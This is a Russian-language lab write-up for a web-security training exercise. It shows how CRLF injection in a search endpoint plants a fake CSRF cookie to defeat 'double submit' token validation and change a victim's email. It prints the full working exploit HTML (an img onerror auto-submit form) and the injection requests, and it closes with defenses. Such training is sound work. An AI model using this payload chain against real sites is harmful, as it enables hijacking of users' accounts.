<a id="goal"></a>
## 🎯 Цель
Функционал смены email защищён небезопасной техникой **«double submit»**: параметр `csrf` в теле валидируется путём сравнения с cookie `csrf`. Задача:

1. Использовать exploit server для размещения HTML-страницы с CSRF-атакой.
2. Изменить email жертвы через CSRF.

*Подсказка: нельзя зарегистрировать email, уже занятый другим пользователем. Если при тестировании меняешь свой email — в финальном эксплойте для жертвы используй другой адрес.*

<a id="theory"></a>
## 🧠 Краткая теория
Паттерн «double submit cookie» хранит CSRF-токен одновременно в cookie и в теле запроса, а валидация сводится к проверке их совпадения. Дизайн предполагает, что атакующий **не может устанавливать cookie** в браузере жертвы для целевого домена.

Однако если какой-либо endpoint отражает пользовательский ввод в заголовок ответа `Set-Cookie` (CRLF-инъекция), атакующий может кросс-доменно посадить в браузер жертвы **произвольную фейковую csrf-cookie**. После этого атакующий сабмитит форму, чей параметр `csrf` несёт **то же фейковое значение** — cookie и параметр совпадают, валидация проходит, и токен не даёт никакой защиты.

<a id="idea"></a>
## 🧩 Ключевая идея
Валидация = `cookie csrf` == `body csrf`. Обе половины контролируются атакующим:

1. **Половина-cookie:** инъекция `csrf=fake` в браузер жертвы через CRLF-инъекцию в незащищённом search-endpoint (`/?search=test%0d%0aSet-Cookie: csrf=fake; SameSite=None`).
2. **Половина-body:** эксплойт-форма просто содержит `<input name="csrf" value="fake">`.

Знание какого-либо серверного токена не требуется — «секрет» полностью fabricated атакующим.

<a id="attack-scheme"></a>
## 🗺 Схема атаки
1. **Разведка:** Перехват `POST /my-account/change-email`; фиксация cookie `csrf` и параметра `csrf` в теле.
2. **Проверка:** Изменение одной из пары → отказ; сервер лишь сравнивает cookie с параметром.
3. **Точка инъекции:** Search-запрос отражается в `Set-Cookie` → CRLF-инъекция cookie.
4. **Эксплойт:** `<img>` инъецирует cookie `csrf=fake`, `onerror` сабмитит форму с `csrf=fake`.
5. **Проверка:** View exploit на себе → email изменён.
6. **Доставка:** Deliver to victim → лаба решена.

<a id="step1"></a>
## 🔍 Шаг 1 — Анализ легитимного запроса
Авторизовался под `wiener:peter` в браузере Burp, отправил форму «Update email» и нашёл результирующий запрос в Proxy history. Отправил его в Repeater.

```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER; csrf=CSRF_TOKEN_FROM_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN_FROM_BODY
```

Примечание: токен существует **дважды** — как cookie и как параметр тела.

<a id="step2"></a>
## 🔍 Шаг 2 — Проверка валидации «double submit»
В Repeater проверил логику валидации:

- Изменил только параметр `csrf` в теле → отказ ("Invalid CSRF token").
- Изменил и cookie `csrf`, и параметр `csrf` на одно и то же произвольное значение → **принято**.

*Вывод: сервер просто сравнивает cookie с параметром тела. Никакой привязки к сессии, никакого серверного хранилища токенов — любая самосогласованная пара проходит.*

<a id="step3"></a>
## 🔍 Шаг 3 — Поиск точки инъекции cookie
Выполнил **поиск** на сайте и отправил запрос в Repeater.

Обнаружил, что поисковый запрос **отражается в заголовке ответа `Set-Cookie`**. Функция поиска **не имеет CSRF-защиты**, поэтому любой origin может её вызвать и посадить cookie в браузер жертвы.

PoC-URL инъекции (URL-кодированный CRLF `%0d%0a`):

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

- `%0d%0a` — CRLF, выход из отражаемого значения в новый заголовок.
- `SameSite=None` — обязательно, чтобы инъецированная cookie отправлялась в кросс-сайтовых запросах.

<a id="step4"></a>
## 🔍 Шаг 4 — Сборка CSRF-эксплойта с инъекцией cookie
Собрал эксплойт на основе запроса смены email со значением `csrf` = `fake`, удалил блок автосабмита `<script>` и добавил `<img>`, который инъецирует cookie и сабмитит форму в обработчике `onerror`:

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="csrf" value="fake">
    <input type="hidden" name="email" value="attacker@web-security-academy.net">
</form>
<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

**Как это работает:**
1. `<img>` инициирует GET к уязвимому search-endpoint → ответ содержит `Set-Cookie: csrf=fake; SameSite=None` → браузер жертвы теперь хранит фейковую cookie.
2. Картинка не рендерится → срабатывает `onerror` → форма отправляется с `csrf=fake`.
3. Cookie `csrf=fake` == параметр `csrf=fake` → валидация проходит → email изменён.

<a id="step5"></a>
## 🔍 Шаг 5 — Проверка эксплойта на себе
Разместил HTML в поле «Body» exploit-сервера, сохранил и нажал «View exploit». Убедился, что email изменён.

⚠️ Согласно подсказке: email должны быть уникальными — в финальном эксплойте используй **другой** адрес, чем при тестировании.

<a id="step6"></a>
## 🔍 Шаг 6 — Доставка эксплойта жертве
Обновил email в эксплойте на свежий неиспользованный адрес, сохранил и нажал «Deliver to victim». Email жертвы изменён → лаба решена.

<a id="requests"></a>
## 📨 Примеры запросов
**Легитимный запрос (double submit)**
```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER; csrf=CSRF_TOKEN_FROM_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN_FROM_BODY
```

**Обход валидации (самосогласованная фейковая пара)**
```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_VICTIM; csrf=fake
Content-Type: application/x-www-form-urlencoded

email=attacker@web-security-academy.net&csrf=fake
```

**Инъекция cookie через search-endpoint**
```http
GET /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None HTTP/2
Host: LAB-ID.web-security-academy.net
```

<a id="response"></a>
## 📥 Пример результата
**Проверка валидации**
- Несовпадающие cookie/параметр → "Invalid CSRF token" (отказ)
- Самосогласованная произвольная пара (`csrf=fake` и в cookie, и в body) → 302 Redirect (успех)

**Проверка инъекции cookie**
- `GET /?search=test%0d%0aSet-Cookie: csrf=fake...` → ответ содержит `Set-Cookie: csrf=fake; SameSite=None`  
→ CRLF-инъекция работает, фейковая cookie сажается кросс-доменно

**Эксплойт**
- Сессия жертвы + инъецированная cookie `csrf=fake` + параметр `csrf=fake` → 302 Redirect (успех)  
→ Email изменён полностью сфабрикованным токеном

<a id="attack-chain"></a>
## 🧾 Полная цепочка атаки
1. Логин под wiener → перехват `POST /my-account/change-email` → фиксация cookie csrf + параметра csrf.
2. Repeater: подтверждение, что валидация — лишь сравнение cookie с параметром.
3. Search-endpoint → отражение в `Set-Cookie` → CRLF-инъекция cookie.
4. Эксплойт: `<img>` инъецирует `csrf=fake` (SameSite=None), `onerror` сабмитит форму с `csrf=fake`.
5. View exploit → проверка на себе → email изменён.
6. Свежий email в эксплойте → Deliver to victim → **Solved**.

<a id="breakdown"></a>
## 🔬 Почему атака сработала
- **Слабый примитив:** паттерн «double submit» доказывает лишь совпадение cookie и параметра — но не то, что запрос намеренно сделал пользователь.
- **Обе половины под контролем атакующего:** CRLF-инъекция позволяет установить cookie; HTML формы содержит параметр. Сравнение сравнивает данные атакующего с данными атакующего.
- **Нет серверного состояния:** токен не хранится в сессии, поэтому нечего привязывать или верифицировать на сервере.
- **SameSite=None:** инъецированная cookie явно помечена для отправки в кросс-сайтовых запросах.
- **Цепочка примитивов:** header-инъекция (GET, без CSRF-защиты) + автосабмит формы (POST) = полный обход.

<a id="pentester"></a>
## 🧠 Как думать как пентестер
1. **Спрашивай, что именно сравнивает валидация:** токен-vs-сессия — сильно; токен-vs-cookie («double submit») — слабо, если cookie инъецируемы.
2. **Тестируй самосогласованной фейковой парой:** поменяй и cookie, и параметр на одно произвольное значение — если проходит, токен декоративный.
3. **Ищи точки инъекции cookie:** отражение в `Set-Cookie` (CRLF) превращает «слабый паттерн» в «нулевой защиты».
4. **Помни про SameSite:** инъецированным cookie нужен `SameSite=None`, чтобы отправляться в кросс-сайтовых запросах.
5. **Соединяй примитивы:** безобидное на вид отражение в поле поиска — ключ, открывающий весь обход.

<a id="mistakes"></a>
## ❌ Типичные ошибки
- **Изменение только параметра тела:** несовпадающая пара отклоняется — обе половины должны быть установлены атакующим на **одно** значение.
- **Оставлен автосабмит `<script>`:** скрипт сработает до того, как `<img>` установит cookie — удали его и сабмить из `onerror`.
- **Несовпадение значений токена:** значение инъецированной cookie должно точно совпадать со значением `csrf` в форме (`fake` == `fake`).
- **Забыт SameSite=None в инъекции:** без него браузер не отправит инъецированную cookie в кросс-сайтовом POST.
- **Ошибки URL-кодирования:** `%0d%0a` для CRLF, `%3b` для `;`, `%20` для пробелов — некодированные символы ломают инъекцию заголовка.
- **Одинаковый email в тесте и финальном эксплойте:** email уникальны; финальному эксплойту нужен другой адрес.

<a id="defense"></a>
## 🛡 Защита
- **Привязывать CSRF-токен к сессии** — хранить токен на сервере в объекте сессии и валидировать пару (сессия, токен), а не cookie-vs-параметр.
- Паттерн double submit допустим только если cookie **устанавливается сервером с непредсказуемым значением** и **защищён от инъекции** — здесь это не так.
- **Устранить CRLF-инъекцию** — отклонять CR/LF в любом вводе, отражаемом в заголовки ответа; современные фреймворки блокируют header-инъекцию по умолчанию.
- **SameSite-cookies** (Lax/Strict) для сессионной cookie как эшелонированная защита.
- Проверка заголовков **Origin/Referer** для запросов, изменяющих состояние.

<a id="conclusion"></a>
## 🧾 Итог
Лаба демонстрирует, почему паттерн «double submit cookie» проваливается, когда атакующий может устанавливать cookie: валидация сравнивает два значения, контролируемых атакующим. CRLF-инъекция в незащищённом endpoint позволяет посадить `csrf=fake` в браузер жертвы, а форма несёт то же значение — проверка проходит по построению. Ключевой урок: стойкость любой CSRF-защиты зависит от того, какие значения атакующий не может контролировать; если все входы сравнения инъецируемы, защита — фикция.
